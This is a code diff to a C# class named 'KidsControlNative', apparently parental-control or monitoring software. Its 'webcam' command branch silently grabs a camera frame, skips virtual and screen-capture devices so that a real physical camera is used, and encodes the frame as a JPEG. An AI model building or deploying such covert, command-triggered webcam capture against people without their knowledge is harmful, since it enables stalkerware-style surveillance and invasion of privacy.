@@ -52,27 +52,55 @@ class KidsControlNative {
                 }
             } else if (cmd == "webcam") {
                 StringBuilder name = new StringBuilder(128);
-                StringBuilder ver = new StringBuilder(128);
-                bool hasDriver = capGetDriverDescriptionA(0, name, 128, ver, 128);
-                if (!hasDriver) {
+                StringBuilder ver  = new StringBuilder(128);
+
+                // Search for a real physical camera — skip virtual/screen capture devices
+                bool found = false;
+                short realDriverIdx = 0;
+                for (short i = 0; i < 10; i++) {
+                    name = new StringBuilder(128);
+                    ver  = new StringBuilder(128);
+                    bool exists = capGetDriverDescriptionA(i, name, 128, ver, 128);
+                    if (!exists) break;
+                    string drvName = name.ToString().ToLower();
+                    // Reject known virtual / screen-capture devices
+                    if (drvName.Contains("screen") || drvName.Contains("virtual") ||
+                        drvName.Contains("obs")    || drvName.Contains("split")   ||
+                        drvName.Contains("desktop")|| drvName.Contains("game")    ||
+                        drvName.Contains("display")) {
+                        continue;
+                    }
+                    found = true;
+                    realDriverIdx = i;
+                    break;
+                }
+
+                if (!found) {
                     Console.WriteLine("NO_WEBCAM");
                     return;
                 }
 
                 IntPtr hwnd = capCreateCaptureWindowA("Webcam", 0, 0, 0, 640, 480, IntPtr.Zero, 0);
-                int connected = SendMessage(hwnd, 1034, 0, 0); // WM_CAP_DRIVER_CONNECT
+                int connected = SendMessage(hwnd, 1034, realDriverIdx, 0); // WM_CAP_DRIVER_CONNECT
                 if (connected == 0) {
                     Console.WriteLine("NO_WEBCAM");
                     return;
                 }
 
-                Thread.Sleep(800);
+                Thread.Sleep(1000);
                 SendMessage(hwnd, 1084, 0, 0); // WM_CAP_GRAB_FRAME
                 SendMessage(hwnd, 1054, 0, 0); // WM_CAP_EDIT_COPY
                 SendMessage(hwnd, 1035, 0, 0); // WM_CAP_DRIVER_DISCONNECT
 
                 if (Clipboard.ContainsImage()) {
                     using (Image img = Clipboard.GetImage()) {
+                        // Reject if image size matches the screen (it's a screen capture device)
+                        Rectangle screen = Screen.PrimaryScreen.Bounds;
+                        if (img.Width >= screen.Width * 0.85 || img.Height >= screen.Height * 0.85) {
+                            Clipboard.Clear();
+                            Console.WriteLine("NO_WEBCAM");
+                            return;
+                        }
                         using (MemoryStream ms = new MemoryStream()) {
                             img.Save(ms, ImageFormat.Jpeg);
                             byte[] bytes = ms.ToArray();
